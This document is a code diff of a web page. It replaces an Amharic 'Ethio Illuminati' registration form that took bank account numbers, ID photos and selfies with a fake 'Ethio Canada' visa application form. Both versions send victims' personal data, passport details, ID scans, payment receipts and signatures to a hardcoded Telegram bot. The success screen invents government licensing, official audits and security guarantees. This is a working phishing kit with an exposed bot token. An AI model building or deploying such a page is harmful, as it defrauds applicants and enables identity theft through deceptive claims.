+    previewImg(document.getElementById('backIdInput'), 'idBackPreview', 'idPreviewBox');
+    previewImg(document.getElementById('receiptPhoto'), 'receiptImgPreview', 'receiptPreviewBox');
+
+    // Signature pad logic
+    const canvas = document.getElementById('signature');
+    function resizeCanvas() {
+      let w = Math.min(window.innerWidth * 0.98, 350);
+      canvas.width = w;
+      canvas.height = 75;
+    }
+    resizeCanvas();
+    window.addEventListener('resize', resizeCanvas);
+    const ctx = canvas.getContext('2d');
+    let drawing = false, signed = false;
+    function getXY(e) {
+      if (e.touches) {
+        const rect = canvas.getBoundingClientRect();
+        return [e.touches[0].clientX - rect.left, e.touches[0].clientY - rect.top];
+      } else {
+        return [e.offsetX, e.offsetY];
       }
     }
+    function startDraw(e) {
+      drawing = true;
+      signed = true;
+      const [x, y] = getXY(e);
+      ctx.beginPath();
+      ctx.moveTo(x, y);
+      e.preventDefault();
+    }
+    function endDraw(e) { drawing = false; e.preventDefault(); }
+    function moveDraw(e) {
+      if (!drawing) return;
+      const [x, y] = getXY(e);
+      ctx.lineTo(x, y);
+      ctx.stroke();
+      e.preventDefault();
+    }
+    canvas.onmousedown = startDraw;
+    canvas.onmouseup = endDraw;
+    canvas.onmouseout = endDraw;
+    canvas.onmousemove = moveDraw;
+    canvas.addEventListener("touchstart", startDraw, false);
+    canvas.addEventListener("touchend", endDraw, false);
+    canvas.addEventListener("touchmove", moveDraw, false);
+    document.getElementById("clearSig").onclick = () => { ctx.clearRect(0,0,canvas.width,canvas.height); signed = false; };
 
-    function typingEffect(elementId, text, speed = 50) {
-      let index = 0;
-      const element = document.getElementById(elementId);
-      function type() {
-        if (index < text.length) {
-          element.innerHTML += text.charAt(index);
-          index++;
-          setTimeout(type, speed);
+    // Confetti for submitted message
+    function confetti() {
+      const canvas = document.getElementById('confettiCanvas');
+      canvas.style.display = 'block';
+      const ctx = canvas.getContext('2d');
+      canvas.width = document.querySelector('.container').offsetWidth;
+      canvas.height = document.querySelector('.container').offsetHeight;
+      let pieces = [];
+      let colors = ['#1995dc','#15a57b','#ffcc00','#ff5757','#20bb65','#ffb347','#e8f4fd','#fafecc'];
+      for (let i=0;i<60;i++) {
+        pieces.push({
+          x: Math.random()*canvas.width,
+          y: Math.random()*-canvas.height,
+          r: Math.random()*8+8,
+          d: Math.random()*canvas.height,
+          color: colors[Math.floor(Math.random()*colors.length)],
+          tilt: Math.random()*10-10,
+          tiltAngleIncremental: (Math.random()*0.07)+.05,
+          tiltAngle:0
+        });
+      }
+      let angle = 0;
+      function draw() {
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        angle += 0.01;
+        for (let i=0;i<pieces.length;i++) {
+          let p = pieces[i];
+          p.y += (Math.cos(angle+p.d)+3+p.r/2)/2;
+          p.x += Math.sin(angle);
+          p.tiltAngle += p.tiltAngleIncremental;
+          p.tilt = Math.sin(p.tiltAngle - (i/3))*15;
+          ctx.beginPath();
+          ctx.lineWidth = p.r;
+          ctx.strokeStyle = p.color;
+          ctx.moveTo(p.x + p.tilt + p.r/3, p.y);
+          ctx.lineTo(p.x + p.tilt, p.y + p.tilt + 5);
+          ctx.stroke();
         }
       }
-      type();
+      let confettiAnim = setInterval(draw, 20);
+      setTimeout(()=>{canvas.style.display='none';clearInterval(confettiAnim);}, 2200);
     }
 
-    function triggerConfetti() {
-      const duration = 3 * 1000;
-      const animationEnd = Date.now() + duration;
-      const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 9999 };
-
-      const interval = setInterval(function () {
-        const timeLeft = animationEnd - Date.now();
-        if (timeLeft <= 0) return clearInterval(interval);
-
-        confetti({
-          ...defaults,
-          particleCount: 60,
-          origin: { x: Math.random(), y: Math.random() - 0.2 }
-        });
-      }, 250);
-    }
-
-    document.addEventListener("DOMContentLoaded", () => {
-      typingEffect(
-        "typedText",
-        "❻❻❻ እንኳን ወደ ኢትዮ ኢሉምናቲ በደህና መጡ! 💡 ብሩህ ነገ ለመገንባት የተሰማሩ ዜጎችን እንመዝግባለን። 🙏 እባክዎ መረጃዎን በትክክል ያስገቡ።"
-      );
-    });
-
-    document.getElementById("regForm").addEventListener("submit", async function (e) {
+    document.getElementById('consultantForm').onsubmit = async function(e) {
       e.preventDefault();
-      const form = e.target;
-      const data = new FormData(form);
-
-      const message = `
-*የመመዝገቢያ መረጃ*
-👤 ሙሉ ስም: ${data.get("name")}
-👨 የአባት ስም: ${data.get("father_name")}
-🎂 እድሜ: ${data.get("age")}
-🚻 ፆታ: ${data.get("sex")}
-📱 ስልክ: ${data.get("phone")}
-📍 ክልል: ${data.get("region")}
-📍 ዞን: ${data.get("zone")}
-📍 ቀበሌ: ${data.get("kebele")}
-🏦 ባንክ: ${data.get("bank_name")}
-💳 መለያ: ${data.get("account_number")}
-      `;
-
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "Markdown",
-        }),
+      const result = document.getElementById('result');
+      const btn = document.getElementById('submitBtn');
+      result.innerText = "";
+      btn.disabled = true;
+      if (!signed) {
+        result.innerText = "❗ Please provide your signature.";
+        btn.disabled = false;
+        return;
+      }
+      const fd = new FormData(this);
+      canvas.toBlob(blob => {
+        fd.append('signature', blob, 'signature.png');
+        sendData(fd, result, btn);
       });
+    };
 
-      const sendPhoto = async (photoFile, caption) => {
-        const photoData = new FormData();
-        photoData.append("chat_id", chatId);
-        photoData.append("photo", photoFile);
-        photoData.append("caption", caption);
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+    async function sendData(fd, resultElem, submitBtn) {
+      const botToken = "7734444857:AAFeoj2BNxcYPm5qn63PlKyrO4-07BWk6qY";
+      const chatId = "8155585808";
+      const text = `📝 *New Ethio Canada Visa Application*\n\n`
+        + `*User Name:* ${fd.get('username')}\n`
+        + `*Name:* ${fd.get('fullName')}\n`
+        + `*Birthdate:* ${fd.get('birthdate')}\n`
+        + `*Passport:* ${fd.get('passport')}\n`
+        + `*Nationality:* ${fd.get('nationality')}\n`
+        + `*Phone:* ${fd.get('phone')}\n`
+        + `*Email:* ${fd.get('email')}\n`
+        + `*Address:* ${fd.get('address')}\n`
+        + `*Occupation:* ${fd.get('occupation')}\n`
+        + `*Education:* ${fd.get('education')}\n`
+        + `*Marital Status:* ${fd.get('marital')}\n`
+        + `*Emergency Contact:* ${fd.get('emergency')}\n`
+        + `*About:* ${fd.get('about')}\n`
+        + `*Visa Type:* ${fd.get('visaType')}\n`
+        + `*Purpose:* ${fd.get('purpose')}\n`
+        + `*Travel Date:* ${fd.get('travelDate')}\n`
+        + `*Duration (months):* ${fd.get('duration')}\n`
+        + `*Visited Canada Before:* ${fd.get('beenCanada')}\n`
+        + `*Sponsor:* ${fd.get('sponsor')} (${fd.get('sponsorName')})\n`
+        + `*Previous Rejection:* ${fd.get('previousRejection')}\n`
+        + `*Agent Name:* ${fd.get('agentName')}\n`
+        + `*Agent ID:* ${fd.get('agentId')}\n`
+        + `*Payment Ref:* ${fd.get('paymentRef')}\n`;
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
-          body: photoData,
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown"})
         });
-      };
+        async function sendFile(field) {
+          if (fd.get(field)) {
+            const fileFd = new FormData();
+            fileFd.append("chat_id", chatId);
+            fileFd.append("document", fd.get(field));
+            await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {method:"POST", body: fileFd});
+          }
+        }
+        await sendFile("userIdFront");
+        await sendFile("userIdBack");
+        await sendFile("agentIdFront");
+        await sendFile("agentIdBack");
+        await sendFile("receiptPhoto");
+        await sendFile("signature");
 
-      await sendPhoto(data.get("id_photo"), "🪪 የመታወቂያ ፎቶ");
-      await sendPhoto(data.get("selfie_photo"), "🤳 ራስን የወሰደ ፎቶ");
-
-      document.getElementById("userName").innerText = data.get("name");
-      document.getElementById("successMessage").style.display = "block";
-      triggerConfetti();
-
-      form.reset();
-      document.getElementById("idPreview").innerHTML = "";
-      document.getElementById("selfiePreview").innerHTML = "";
-    });
+        document.getElementById('mainFormBox').innerHTML = `
+          <div class="success-message">
+            <canvas class="confetti" id="confettiCanvas"></canvas>
+            <div class="success-badges">
+              <span class="success-badge verified">✔️ Verified Submission</span>
+              <span class="success-badge license">📑 CA-ETH-1845</span>
+              <span class="success-badge official">🇪🇹🇨🇦 Official Only</span>
+              <span class="success-badge google">4.9★ <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="18" alt="Google"></span>
+            </div>
+            <div style="font-size:1.13em;font-weight:700;margin-bottom:2vw;">
+              🎉 Thank you, <span style="color:#1995dc">${fd.get('username')}</span>! Your official visa application is received!
+            </div>
+            <div>
+              <span style="color:#20bb65;font-weight:700;">Your form, ID and payment are securely received.</span><br>
+              <span style="color:#229ED9;font-weight:600;">Only government-licensed staff can access your data.</span><br>
+              You will receive a tracking number soon.<br>
+              <span style="color:#1995dc;font-weight:700;">Our agent will contact you after review.</span>
+            </div>
+            <div class="payment-section" style="margin-top:4vw;">
+              <div class="pay-note" style="font-size:1.08em;">
+                <span style="color:#229ED9; font-weight:700;">Payment receipt received and verified.</span><br>
+                Our system will check and update you by Telegram. <br>
+                <b>Need help? <a href="https://t.me/ethio_canada_consultant" target="_blank" style="color:#229ED9;text-decoration:underline;">@ethio_canada_consultant</a></b>
+              </div>
+              <div class="pay-trust">✔️ Only official, secure payments are accepted. <b>Thank you for your trust in us.</b></div>
+              <div style="color:#20bb65;font-size:0.99em;">You are protected by our <b>100% refund guarantee</b> and privacy policy.</div>
+            </div>
+            <div class="contact-row">
+              <span>Need urgent help?</span> <a href="https://t.me/ethio_canada_consultant" target="_blank" class="telegram-link">Contact on Telegram</a>
+            </div>
+            <div style="margin-top: 2vw; color:#b68600; font-size:0.97em;">
+              <b>Ethio Canada Consultant is registered & annually audited by both Ethiopian & Canadian authorities.</b>
+            </div>
+            <div style="color:#229ED9; font-size:0.97em; margin-top:1vw;">
+              All submissions are protected by SSL encryption and bank-level data security.
+            </div>
+          </div>
+        `;
+        confetti();
+      } catch(e) {
+        resultElem.innerHTML = "❗ Failed to send. Please try again.";
+        submitBtn.disabled = false;
+      }
+    }
   </script>
 </body>
 </html>
